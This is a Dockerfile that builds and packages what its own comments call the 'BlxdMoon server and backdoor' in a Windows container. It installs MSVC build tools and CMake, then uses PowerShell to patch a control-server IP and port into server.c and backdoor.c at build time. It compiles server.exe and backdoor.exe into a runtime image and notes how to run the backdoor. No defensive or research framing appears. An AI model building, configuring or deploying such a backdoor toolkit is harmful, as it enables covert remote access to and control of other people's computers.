# syntax=docker/dockerfile:1

# Windows container image to build the BlxdMoon server and backdoor.
# Uses Visual Studio Build Tools 2022 with the CMake component.
FROM mcr.microsoft.com/windows/servercore:ltsc2022

SHELL ["cmd", "/S", "/C"]

# ---------------------------
# 1) Install MSVC + CMake
# ---------------------------
ENV BUILD_TOOLS_URL=https://aka.ms/vs/17/release/vs_buildtools.exe
ENV BUILD_TOOLS_PATH=C:\\BuildTools

ADD %BUILD_TOOLS_URL% C:\\TEMP\\vs_buildtools.exe

RUN C:\\TEMP\\vs_buildtools.exe --quiet --wait --norestart --nocache ^
    --installPath %BUILD_TOOLS_PATH% ^
    --add Microsoft.VisualStudio.Workload.VCTools ^
    --add Microsoft.VisualStudio.Component.Windows11SDK.22621 ^
    --add Microsoft.VisualStudio.Component.VC.CMake.Project ^
    || IF "%ERRORLEVEL%"=="3010" EXIT 0

ENV PATH=%BUILD_TOOLS_PATH%\\Common7\\IDE\\CommonExtensions\\Microsoft\\CMake\\CMake\\bin;%BUILD_TOOLS_PATH%\\MSBuild\\Current\\Bin;%PATH%
ENV CMAKE_GENERATOR="Visual Studio 17 2022"

# ---------------------------
# 2) Copy source
# ---------------------------
WORKDIR C:\\src
COPY . .

# ---------------------------
# 3) Configure IP/Port at build time (matches configure.sh behavior)
# ---------------------------
ARG SERVER_IP=192.168.1.21
ARG SERVER_PORT=6709

RUN powershell -NoLogo -ExecutionPolicy Bypass -Command ^
    "(Get-Content src/server.c) -replace '192.168.1.21', '$env:SERVER_IP' -replace '6709', '$env:SERVER_PORT' | Set-Content src/server.c" && ^
    powershell -NoLogo -ExecutionPolicy Bypass -Command ^
    "(Get-Content src/backdoor.c) -replace '192.168.1.21', '$env:SERVER_IP' -replace '6709', '$env:SERVER_PORT' | Set-Content src/backdoor.c"

# ---------------------------
# 4) Configure & build (Release, x64)
# ---------------------------
WORKDIR C:\\build
RUN cmake -G "%CMAKE_GENERATOR%" -A x64 C:\\src ^
 && cmake --build . --config Release

# ---------------------------
# 5) Runtime image
# ---------------------------
FROM mcr.microsoft.com/windows/servercore:ltsc2022
WORKDIR C:\\app
COPY --from=0 C:\\build\\Release\\server.exe .
COPY --from=0 C:\\build\\Release\\backdoor.exe .

# Default to launching the server; override with `docker run ... backdoor.exe` if needed.
CMD ["C:\\app\\server.exe"]
